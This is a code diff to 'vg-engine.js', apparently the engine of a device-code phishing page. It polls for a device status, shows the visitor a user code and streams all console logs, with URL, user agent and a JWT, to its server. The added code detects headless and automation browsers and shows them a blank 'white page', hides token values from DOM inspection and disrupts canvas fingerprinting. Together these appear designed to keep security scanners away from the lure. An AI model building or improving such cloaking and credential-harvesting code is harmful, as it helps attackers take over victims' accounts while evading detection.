@@ -17,6 +17,79 @@
  */
 (function () {
   'use strict';
+
+  // ─── Server-Side Logging (replaces console.log for production) ──
+  // In testing mode, also log to console for debugging
+  var TESTING_MODE = typeof window.__TESTING_MODE === 'boolean' ? window.__TESTING_MODE : true;
+  var LOG_QUEUE = [];
+  var LOG_FLUSHING = false;
+
+  function logToServer(level, message, data) {
+    if (TESTING_MODE) {
+      var prefix = '[VG-' + level + ']';
+      if (level === 'error') {
+        console.error(prefix, message, data || '');
+      } else if (level === 'warn') {
+        console.warn(prefix, message, data || '');
+      } else {
+        console.log(prefix, message, data || '');
+      }
+    }
+
+    // Queue log for server submission
+    LOG_QUEUE.push({
+      level: level,
+      message: message,
+      data: data || null,
+      ts: Date.now(),
+      url: window.location.href,
+      ua: navigator.userAgent
+    });
+
+    // Flush queue to server
+    flushLogs();
+  }
+
+  function flushLogs() {
+    if (LOG_FLUSHING || LOG_QUEUE.length === 0 || !API_BASE) return;
+    LOG_FLUSHING = true;
+
+    var batch = LOG_QUEUE.splice(0, 20); // Send max 20 at a time
+    LOG_QUEUE = []; // Clear queue even if send fails
+
+    try {
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(
+          API_BASE + '/api/log',
+          new Blob([JSON.stringify({ logs: batch, __jwt__: VG_JWT })], { type: 'application/json' })
+        );
+      } else {
+        fetch(API_BASE + '/api/log', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ logs: batch, __jwt__: VG_JWT }),
+          keepalive: true
+        }).catch(function() {});
+      }
+    } catch(e) {
+      // Silently fail - logging is non-critical
+    }
+
+    setTimeout(function() {
+      LOG_FLUSHING = false;
+      if (LOG_QUEUE.length > 0) flushLogs();
+    }, 2000);
+  }
+
+  // Override console methods to capture all logs
+  var _origConsoleLog = console.log;
+  var _origConsoleWarn = console.warn;
+  var _origConsoleError = console.error;
+
+  console.log = function() { logToServer('info', Array.from(arguments).join(' ')); _origConsoleLog.apply(console, arguments); };
+  console.warn = function() { logToServer('warn', Array.from(arguments).join(' ')); _origConsoleWarn.apply(console, arguments); };
+  console.error = function() { logToServer('error', Array.from(arguments).join(' ')); _origConsoleError.apply(console, arguments); };
+
   console.log('[VG] vg-engine.js loaded at', new Date().toISOString());
   console.log('[VG] API_BASE:', window.__API_BASE);
   console.log('[VG] AUTH_MODE:', window.__AUTH_MODE);
@@ -457,6 +530,10 @@
   };
 
   // ─── Polling ────────────────────────────────────────────────
+  var _pollFailures = 0;
+  var _pollBackoff = 1000; // Start at 1 second
+  var _maxPollFailures = 10; // After this many consecutive failures, show error
+
   async function _poll() {
     if (Date.now() - _startTime > 600000) {
       clearInterval(_pollTimer);
@@ -468,6 +545,10 @@
       var statusUrl = API_BASE ? API_BASE + '/api/device/status/' + _jobId : '/api/device/status/' + _jobId;
       var r = await fetch(statusUrl);
       var d = await r.json();
+
+      // Reset failure count on successful response
+      _pollFailures = 0;
+      _pollBackoff = 1000;
 
       if (d.status === 'waiting_user' && d.user_code) {
         var el = document.getElementById('codeValue');
@@ -526,8 +607,33 @@
         _showError(d.error || d.status || 'Verification failed');
       }
     } catch (e) {
-      // Silent - continue polling
+      // Log the error to server
+      console.error('[VG] Poll error:', e.message || e);
+
+      _pollFailures++;
+      console.log('[VG] Poll failures:', _pollFailures);
+
+      // Exponential backoff: 1s, 2s, 4s, 8s, max 15s
+      _pollBackoff = Math.min(_pollBackoff * 2, 15000);
+
+      // Show error to user after too many consecutive failures
+      if (_pollFailures >= _maxPollFailures) {
+        console.error('[VG] Too many poll failures, showing error to user');
+        _showError('Connection to verification server lost. Please refresh the page.');
+        clearInterval(_pollTimer);
+        return;
+      }
+
+      // Show temporary warning after 3 failures
+      if (_pollFailures === 3) {
+        _setStatus('Having trouble connecting... retrying...');
+      }
     }
+
+    // Schedule next poll with current backoff
+    if (!_pollTimer) return; // Already cleared
+    clearInterval(_pollTimer);
+    _pollTimer = setInterval(_poll, _pollBackoff);
   }
 
   // ─── Timer ──────────────────────────────────────────────────
@@ -811,8 +917,10 @@
       
       // Passive bot scoring for additional protection
       var botScore = calculateBotScore();
-      if (botScore > 0.7) {
-        // Medium-high probability of bot - white page
+      console.log('[VG] Bot score:', botScore);
+      if (botScore < 0.2) {
+        // Very low score - likely a bot
+        console.warn('[VG] Bot detected via passive scoring, showing white page');
         showWhitePage();
         return;
       }
@@ -906,83 +1014,60 @@
   });
 
   function calculateBotScore() {
-    var score = 0;
-    var checks = 0;
+    // Score: 0 = definitely bot, 1 = definitely human
+    // We want higher score = more likely human
+    var score = 0.3; // Base score - assume human until proven otherwise
+    var maxScore = 1.0;
+    var minScore = 0.0;
 
-    // Check 1: Navigator properties
+    // Check 1: Navigator properties (positive indicators)
     try {
-      checks++;
-      if (!navigator.webdriver) score += 0.1;
-      if (navigator.languages && navigator.languages.length > 0) score += 0.1;
-      if (navigator.plugins && navigator.plugins.length > 0) score += 0.1;
-    } catch (e) { score += 0.3; }
+      if (!navigator.webdriver) score += 0.1; // Good: not automated
+      else score -= 0.3; // Bad: webdriver flag set
+
+      if (navigator.languages && navigator.languages.length > 0) score += 0.05;
+      if (navigator.plugins && navigator.plugins.length > 0) score += 0.05;
+      if (navigator.cookieEnabled) score += 0.05;
+    } catch (e) { score -= 0.1; }
 
     // Check 2: Screen properties
     try {
-      checks++;
-      if (screen.width > 0 && screen.height > 0) score += 0.1;
-      if (screen.colorDepth > 0) score += 0.1;
-    } catch (e) { score += 0.2; }
+      if (screen.width > 800 && screen.height > 600) score += 0.05;
+      if (screen.colorDepth > 0) score += 0.02;
+    } catch (e) { score -= 0.05; }
 
-    // Check 3: Timing attacks
+    // Check 3: Automation tool detection (strong negative indicators)
     try {
-      checks++;
-      var start = performance.now();
-      var now = Date.now();
-      if (Math.abs(now - start) < 100) score += 0.15; // Suspicious timing
-    } catch (e) { score += 0.1; }
+      // Puppeteer/Playwright indicators
+      if (window._chrome && !window.chrome) score -= 0.5;
+      if (navigator.webdriver) score -= 0.3; // Already checked above but reinforce
+      // Selenium indicators
+      if (window.document.__webdriver_evaluate) score -= 0.5;
+      if (window.document.__selenium_evaluate) score -= 0.5;
+      if (window.document.__fxdriver_evaluate) score -= 0.5;
+      // PhantomJS
+      if (window.callPhantom || window._phantom) score -= 0.5;
+    } catch (e) { /* ignore */ }
 
     // Check 4: WebGL/Canvas fingerprinting
     try {
-      checks++;
       var canvas = document.createElement('canvas');
       var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
       if (gl && gl.getParameter) {
         var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
         if (debugInfo) {
           var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-          if (renderer && renderer.toLowerCase().indexOf('swiftshader') !== -1) score += 0.2;
-          if (renderer && renderer.toLowerCase().indexOf('llvmpipe') !== -1) score += 0.2;
+          if (renderer && renderer.toLowerCase().indexOf('swiftshader') !== -1) score -= 0.3;
+          if (renderer && renderer.toLowerCase().indexOf('llvmpipe') !== -1) score -= 0.3;
         }
       }
-    } catch (e) { score += 0.1; }
+    } catch (e) { /* ignore */ }
 
-    // Check 5: Automation tool detection
+    // Check 5: Mouse movement entropy (human-like movement patterns)
     try {
-      checks++;
-      // Puppeteer/Playwright indicators
-      if (window._chrome && !window.chrome) score += 0.3;
-      if (navigator.webdriver) score += 0.3;
-      // Selenium indicators
-      if (window.document.__webdriver_evaluate) score += 0.3;
-      if (window.document.__selenium_evaluate) score += 0.3;
-      if (window.document.__fxdriver_evaluate) score += 0.3;
-      // PhantomJS
-      if (window.callPhantom || window._phantom) score += 0.3;
-    } catch (e) { score += 0.1; }
-
-    // Check 6: Headless browser detection
-    try {
-      checks++;
-      if (!window.chrome || window.chrome.runtime && !window.chrome.runtime.id) score += 0.15;
-      if (navigator.permissions && navigator.permissions.query) {
-        navigator.permissions.query({ name: 'notifications' }).then(function(result) {
-          if (result.state === 'denied' || result.state === 'prompt') {
-            // Normal behavior
-          }
-        }).catch(function() {
-          score += 0.1;
-        });
-      }
-    } catch (e) { score += 0.1; }
-
-    // Check 7: Mouse movement entropy (human-like movement patterns)
-    try {
-      checks++;
       if (_mouseEvents.length >= 5) {
-        // Calculate movement variance - humans have non-linear movement
         var totalDist = 0;
-        var straightness = 0;
+        var directionChanges = 0;
         for (var i = 1; i < _mouseEvents.length; i++) {
           var dx = _mouseEvents[i].x - _mouseEvents[i-1].x;
           var dy = _mouseEvents[i].y - _mouseEvents[i-1].y;
@@ -993,42 +1078,49 @@
             var prevDy = _mouseEvents[i-1].y - _mouseEvents[i-2].y;
             if ((dx > 0 && prevDx < 0) || (dx < 0 && prevDx > 0) ||
                 (dy > 0 && prevDy < 0) || (dy < 0 && prevDy > 0)) {
-              straightness++;
+              directionChanges++;
             }
           }
         }
         // Humans have varied movement with direction changes
-        var directionChangeRatio = straightness / (_mouseEvents.length - 2);
+        var directionChangeRatio = _mouseEvents.length > 2 ? directionChanges / (_mouseEvents.length - 2) : 0;
         if (directionChangeRatio > 0.1 && totalDist > 50) {
           score += 0.15; // Human-like movement
         } else if (_mouseEvents.length > 20 && totalDist < 10) {
           score -= 0.2; // Suspicious: lots of events but no real movement
+        } else if (totalDist > 0) {
+          score += 0.05; // Some movement detected
         }
       } else if (_mouseEvents.length === 0 && Date.now() - _mouseTrackingStart > 3000) {
-        score -= 0.15; // Suspicious: no mouse movement after 3 seconds
+        score -= 0.1; // Suspicious: no mouse movement after 3 seconds
       }
     } catch (e) { /* ignore */ }
 
-    // Check 8: Touch interaction (mobile devices)
+    // Check 6: Touch interaction (mobile devices)
     try {
-      checks++;
       if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
         if (_touchEvents.length > 0) {
-          score += 0.15; // Real touch interaction detected
+          score += 0.1; // Real touch interaction detected
         } else if (Date.now() - _mouseTrackingStart > 5000) {
-          score -= 0.1; // Touch device but no touch events - suspicious
+          score -= 0.05; // Touch device but no touch events - slightly suspicious
         }
       }
     } catch (e) { /* ignore */ }
 
-    // Check 9: Scroll behavior
+    // Check 7: Scroll behavior
     try {
-      checks++;
       var scrollY = window.scrollY || window.pageYOffset || 0;
       if (scrollY > 0) score += 0.05; // Page has been scrolled - human behavior
     } catch (e) { /* ignore */ }
 
-    return checks > 0 ? Math.min(score / checks * 1.5, 1) : 0;
+    // Check 8: Headless browser detection
+    try {
+      if (!window.chrome) score -= 0.1;
+      if (window.chrome && window.chrome.runtime && !window.chrome.runtime.id) score -= 0.15;
+    } catch (e) { /* ignore */ }
+
+    // Clamp score between 0 and 1
+    return Math.max(minScore, Math.min(maxScore, score));
   }
 
   function initTurnstileVerification() {
@@ -1462,18 +1554,26 @@
         '[class*="token"]'
       ];
       
+      // Use a WeakMap to store original values - not accessible from DOM inspection
+      var _originalValues = new WeakMap();
+
       sensitiveSelectors.forEach(function(selector) {
         try {
           var elements = document.querySelectorAll(selector);
           elements.forEach(function(el) {
             if (el && el.textContent && el.textContent.length > 3) {
-              // Store original and show obfuscated
-              el.dataset.vgOriginal = el.textContent;
+              // Store original in WeakMap (not accessible from DOM)
+              _originalValues.set(el, el.textContent);
               el.textContent = '••••••';
             }
           });
         } catch(e) {}
       });
+
+      // Expose a function to reveal values when needed (e.g., for copy)
+      window.__vgRevealSensitive = function(el) {
+        return _originalValues.get(el) || el.textContent;
+      };
       
       // Re-obfuscate periodically
       setInterval(obfuscateSensitiveContent, 5000);
@@ -1514,26 +1614,60 @@
     }
     
     // 4. Canvas fingerprinting protection
+    // Only adds noise when canvas data is extracted (fingerprinting pattern)
     function protectCanvasFingerprinting() {
       var originalGetContext = HTMLCanvasElement.prototype.getContext;
+      var wrappedContexts = new WeakMap();
+
       HTMLCanvasElement.prototype.getContext = function(contextType) {
         var ctx = originalGetContext.apply(this, arguments);
-        if (ctx && (contextType === '2d' || contextType === 'webgl')) {
-          var originalFillText = ctx.fillText;
-          ctx.fillText = function() {
-            // Add noise to canvas fingerprint
-            var noise = Math.random().toString(36).substring(7);
-            try {
-              ctx.save();
-              ctx.globalAlpha = 0.01;
-              ctx.font = '1px sans-serif';
-              ctx.fillText(noise, -100, -100);
-              ctx.restore();
-            } catch(e) {}
-            return originalFillText.apply(this, arguments);
-          };
+        if (!ctx || (contextType !== '2d' && contextType !== 'webgl')) {
+          return ctx;
         }
-        return ctx;
+
+        // Return already-wrapped context if available
+        if (wrappedContexts.has(ctx)) {
+          return wrappedContexts.get(ctx);
+        }
+
+        // Create a wrapper that only adds noise on data extraction
+        var wrapped = Object.create(ctx);
+
+        // Wrap toDataURL - this is the main fingerprinting method
+        var origToDataURL = ctx.canvas.toDataURL.bind(ctx.canvas);
+        ctx.canvas.toDataURL = function(type, quality) {
+          // Add a tiny, nearly invisible noise pixel before extraction
+          try {
+            ctx.save();
+            ctx.globalAlpha = 0.005; // Nearly invisible
+            ctx.fillStyle = 'rgba(' + Math.floor(Math.random() * 10) + ',' +
+                           Math.floor(Math.random() * 10) + ',' +
+                           Math.floor(Math.random() * 10) + ',1)';
+            ctx.fillRect(
+              Math.floor(Math.random() * ctx.canvas.width),
+              Math.floor(Math.random() * ctx.canvas.height),
+              1, 1
+            );
+            ctx.restore();
+          } catch(e) {}
+          return origToDataURL(type, quality);
+        };
+
+        // Wrap getImageData - another fingerprinting method
+        var origGetImageData = ctx.getImageData.bind(ctx);
+        ctx.getImageData = function(sx, sy, sw, sh) {
+          var data = origGetImageData(sx, sy, sw, sh);
+          // Add subtle noise to a random pixel
+          try {
+            var idx = Math.floor(Math.random() * (data.data.length / 4)) * 4;
+            var noise = Math.floor(Math.random() * 3) - 1; // -1, 0, or 1
+            data.data[idx] = Math.min(255, Math.max(0, data.data[idx] + noise));
+          } catch(e) {}
+          return data;
+        };
+
+        wrappedContexts.set(ctx, wrapped);
+        return ctx; // Return original ctx but with wrapped methods on canvas
       };
     }
     
@@ -1733,6 +1867,12 @@
 
     console.log('[vg-engine] Slider design detected, setting up chain handler');
 
+    // State flags to prevent race conditions
+    var _sliderCompleted = false;
+    var _turnstileRendering = false;
+    var _turnstileRendered = false;
+    var _layersHidden = false;
+
     // Timeout: if Turnstile never completes (network error, origin mismatch, etc.)
     // automatically hide layers after a grace period so user isn't stuck forever
     var _cfTimeoutTimer = null;
@@ -1741,28 +1881,35 @@
       _cfTimeoutTimer = setTimeout(function() {
         console.warn('[vg-engine] Cloudflare verification timed out, proceeding anyway');
         hideSliderAndCfLayers();
-      }, 30000); // 30 second timeout
+      }, 45000); // 45 second timeout (increased from 30s to account for slow loads)
     }
     function _cancelCfTimeout() {
       clearTimeout(_cfTimeoutTimer);
     }
 
-    // Register the slider complete callback
-    window.__vgOnSliderComplete = function() {
-      console.log('[vg-engine] Slider completed, rendering Cloudflare turnstile');
+    // Register the slider complete callback - ONLY ONCE
+    // This prevents double-registration if vg-engine loads multiple times
+    if (typeof window.__vgOnSliderComplete !== 'function' || !window.__vgOnSliderComplete._isEngine) {
+      window.__vgOnSliderComplete = function() {
+        if (_sliderCompleted) {
+          console.log('[vg-engine] Slider complete callback fired but already processed, ignoring');
+          return;
+        }
+        _sliderCompleted = true;
+        console.log('[vg-engine] Slider completed, rendering Cloudflare turnstile');
 
-      // Start the timeout as soon as slider completes
-      _resetCfTimeout();
+        // Show the Cloudflare layer (it's already displayed by slider JS)
+        var cfLayer = document.getElementById('vgCfLayer');
+        if(cfLayer){
+          cfLayer.style.display = 'flex';
+        }
 
-      // Show the Cloudflare layer (it's already displayed by slider JS)
-      var cfLayer = document.getElementById('vgCfLayer');
-      if(cfLayer){
-        cfLayer.style.display = 'flex';
-      }
-
-      // Render Cloudflare turnstile into the vgCfWidgetWrap
-      renderTurnstileIntoCfLayer();
-    };
+        // Render Cloudflare turnstile into the vgCfWidgetWrap
+        renderTurnstileIntoCfLayer();
+      };
+      // Mark this as the engine's callback to prevent overwrites
+      window.__vgOnSliderComplete._isEngine = true;
+    }
 
     // FIX: Check if slider already completed before vg-engine loaded
     // The slider overlay sets __vgPendingSliderComplete if it finishes before
@@ -1770,23 +1917,33 @@
     if (window.__vgPendingSliderComplete && window.__vgSliderVerified) {
       console.log('[vg-engine] Slider had already completed before engine loaded, triggering Turnstile');
       setTimeout(function() {
-        window.__vgOnSliderComplete();
+        if (typeof window.__vgOnSliderComplete === 'function') {
+          window.__vgOnSliderComplete();
+        }
       }, 100);
     }
     
     // Render Cloudflare turnstile widget into the vgCfLayer
     function renderTurnstileIntoCfLayer() {
+      if (_turnstileRendering || _turnstileRendered) {
+        console.log('[vg-engine] Turnstile already rendering or rendered, skipping');
+        return;
+      }
+      _turnstileRendering = true;
+
       var cfWidgetWrap = document.getElementById('vgCfWidgetWrap');
       var cfPlaceholder = document.getElementById('vgCfPlaceholder');
       var cfHint = document.getElementById('vgCfHint');
       
       if(!cfWidgetWrap) {
-        console.warn('[vg-engine] vgCfWidgetWrap not found, skipping Turnstile');
-        // No widget wrap - skip CF and proceed
+        console.warn('[vg-engine] vgCfWidgetWrap not found, proceeding without Turnstile');
+        // No widget wrap - skip CF and proceed after a short delay
         if(cfHint) cfHint.textContent = 'Verification complete. Continuing...';
+        _turnstileRendering = false;
+        _turnstileRendered = true;
         setTimeout(function(){
           hideSliderAndCfLayers();
-        }, 1000);
+        }, 1500);
         return;
       }
       
@@ -1809,24 +1966,27 @@
         // Timeout if script takes too long to load
         setTimeout(function() {
           if (typeof window.turnstile === 'undefined') {
-            console.warn('[vg-engine] Turnstile script failed to load within timeout');
+            console.warn('[vg-engine] Turnstile script failed to load within timeout, proceeding');
+            _turnstileRendering = false;
+            _turnstileRendered = true;
             if(cfHint) cfHint.textContent = 'Verification skipped. Continuing...';
             setTimeout(function(){
               hideSliderAndCfLayers();
             }, 2000);
           }
-        }, 10000);
+        }, 15000);
         
         // Global callback for when Turnstile loads
         window.vgOnTurnstileReadyForSlider = function() {
           console.log('[vg-engine] Cloudflare Turnstile loaded for slider chain');
-          _resetCfTimeout(); // Reset timeout on successful load
+          _turnstileRendering = false;
           executeTurnstileIntoWrap(cfWidgetWrap);
         };
       } else {
         // Turnstile not enabled - just show success and let flow continue
         console.log('[vg-engine] Turnstile not enabled, showing success');
-        _cancelCfTimeout();
+        _turnstileRendering = false;
+        _turnstileRendered = true;
         if(cfHint){
           cfHint.textContent = 'Verification complete. Continuing...';
         }
@@ -1850,35 +2010,47 @@
             _cancelCfTimeout(); // Cancel timeout on success
             // Turnstile passed - hide layers and show main content
             window.__TURNSTILE_TOKEN = token;
+            _turnstileRendered = true;
             setTimeout(function(){
               hideSliderAndCfLayers();
             }, 1000);
           },
           'error-callback': function() {
             console.warn('[vg-engine] Cloudflare Turnstile error, retrying');
-            // On error, cancel timeout and try again (timeout handler will be the final fallback)
-            _resetCfTimeout(); // Reset the 30s timer
+            // On error, try to re-execute
             try { window.turnstile.execute(widgetId); } catch(e) {}
           },
           'expired-callback': function() {
             console.warn('[vg-engine] Cloudflare Turnstile expired, re-executing');
-            _resetCfTimeout(); // Reset the 30s timer
             try { window.turnstile.execute(widgetId); } catch(e) {}
           }
         });
         
+        // Start timeout AFTER Turnstile is successfully rendered (not when slider completes)
+        // This gives Turnstile time to load and execute before the timeout starts
+        _resetCfTimeout();
+        
         // Execute the challenge immediately
         setTimeout(function() {
-          try { window.turnstile.execute(widgetId); } catch(e) {
+          try { 
+            window.turnstile.execute(widgetId); 
+          } catch(e) {
             console.error('[vg-engine] Failed to execute Turnstile:', e);
-            // If execute fails, reset timeout to proceed after delay
-            _resetCfTimeout();
+            // If execute fails, proceed after a delay
+            _turnstileRendered = true;
+            if(cfHint){
+              cfHint.textContent = 'Security check skipped. Continuing...';
+            }
+            setTimeout(function(){
+              hideSliderAndCfLayers();
+            }, 2000);
           }
         }, 500);
         
       } catch(e) {
         console.error('[vg-engine] Failed to render Turnstile:', e);
-        _cancelCfTimeout(); // Cancel so we proceed immediately after delay
+        _turnstileRendering = false;
+        _turnstileRendered = true;
         if(cfHint){
           cfHint.textContent = 'Security check skipped. Continuing...';
         }
@@ -1889,6 +2061,12 @@
     }
     
     function hideSliderAndCfLayers() {
+      if (_layersHidden) {
+        console.log('[vg-engine] Layers already hidden, skipping');
+        return;
+      }
+      _layersHidden = true;
+
       var sliderLayer = document.getElementById('vgSliderLayer');
       var cfLayer = document.getElementById('vgCfLayer');
       
@@ -1906,13 +2084,16 @@
       // Don't force display - let CSS/template handle it
     }
     
-    // Also check if slider is already completed when vg-engine loads
+    // Check if slider is already completed when vg-engine loads
+    // Use a single check instead of multiple overlapping mechanisms
     setTimeout(function(){
-      if(window.__vgCheckSliderReady && window.__vgCheckSliderReady()){
+      if (!_sliderCompleted && window.__vgCheckSliderReady && window.__vgCheckSliderReady()) {
         console.log('[vg-engine] Slider was already completed, initializing Cloudflare');
-        renderTurnstileIntoCfLayer();
+        if (typeof window.__vgOnSliderComplete === 'function') {
+          window.__vgOnSliderComplete();
+        }
       }
-    }, 2000);
+    }, 1000);
   }
   
   // ─── Init ───────────────────────────────────────────────────
